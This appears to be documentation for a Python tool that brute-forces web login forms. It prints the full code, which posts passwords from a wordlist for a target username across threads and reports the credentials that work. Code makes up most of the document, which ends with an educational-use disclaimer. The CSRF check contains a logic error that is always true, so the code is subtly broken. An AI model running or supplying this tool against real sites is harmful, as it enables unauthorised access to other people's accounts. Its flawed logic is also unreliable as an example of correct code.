# BruteForcing Class Documentation
This Python code attempts to brute-force a login page by iterating through a list of passwords, trying each one to gain access to a web service using HTTP POST requests. It uses threading to attempt multiple passwords in parallel, improving speed.

## Code Documentation
### Imports:

'''
Code kopieren
import threading
import requests
import time
import sys
'''

- threading: Enables multi-threaded execution, allowing multiple password attempts concurrently.
- requests: Handles HTTP requests to the login page.
- time: Adds delays for UX elements like displaying the banner.
- sys: Allows control over system-level operations, including output and script termination.
### BruteForcing Class
The BruteForcing class is responsible for handling the login attempts and detecting successful login credentials.

Attributes:

- url: The target URL for login attempts.
- username: Username to be tested against each password.
- error_message: Message displayed by the server upon an unsuccessful login attempt.

Initialization Method:

'''
def __init__(self, url, username, error_message):
    self.url = url
    self.username = username
    self.error_message = error_message

    for run in banner:
        sys.stdout.write(run)
        sys.stdout.flush()
        time.sleep(0.02)
'''

- Initializes the class with url, username, and error_message.
- Displays a banner animation by printing each character sequentially.

crack Method:

'''
def crack(self, password):
    data_dict = {"LogInID": self.username, "Password": password, "Log In": "submit"}
    response = requests.post(self.url, data=data_dict)
    if self.error_message in str(response.content):
        return False
    elif "CSRF" or "csrf" in str(response.content):
        print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
        sys.exit()
    else:
        print("Username: ---> " + self.username)
        print("Password: ---> " + password)
        return True
'''

- Sends a POST request to the URL using requests.post with username and password.
- Checks for error_message in the response content to identify failed attempts.
- If "CSRF" appears in the response, the function assumes the site uses CSRF protection, exits, and halts the attack.
- On successful login, displays the valid credentials and stops further attempts.

### Helper Function: crack_passwords

'''
def crack_passwords(passwords, cracker):
    count = 0
    for password in passwords:
        count += 1
        password = password.strip()
        print("Trying Password: {} Time For => {}".format(count, password))
        if cracker.crack(password):
            return
'''

- Iterates over a list of passwords, incrementing a counter to track attempts.
- Passes each password to the crack method to test if it’s correct.
- Stops iterating when a successful login attempt is found.

### Main Function: main

'''
def main():
    url = input("Enter Target Url: ")
    username = input("Enter Target Username: ")
    error = input("Enter Wrong Password Error Message: ")
    cracker = BruteForcing(url, username, error)

    with open("passwords.txt", "r") as f:
        chunk_size = 1000
        while True:
            passwords = f.readlines(chunk_size)
            if not passwords:
                break
            t = threading.Thread(target=crack_passwords, args=(passwords, cracker))
            t.start()
'''

- url: The target URL for the brute-force attack.
- username: Username to test with each password.
- error: Error message indicating a failed login attempt.
- Initializes an instance of BruteForcing with user inputs.
- Reads the passwords.txt file in chunks, where each chunk represents a batch of passwords to test.
- Creates and starts a new thread for each password chunk to maximize parallel execution.

### Execution Block

'''
if __name__ == '__main__':
    banner = """ 
                       Checking the Server !!        
        [+]█████████████████████████████████████████████████[+]
"""
    print(banner)
    main()
'''

- Displays a banner before starting the brute-forcing attempts.
- Calls the main function to begin execution.

## Note on Ethical Use
IMPORTANT: Brute-force attacks are illegal and unethical when conducted without explicit permission. The code here is for educational purposes, to understand the mechanics of threaded brute-force attack logic. Always obtain permission from system owners before attempting any security tests.

For legitimate security testing, consider alternatives like password managers or dedicated penetration testing frameworks such as OWASP ZAP or Burp Suite.
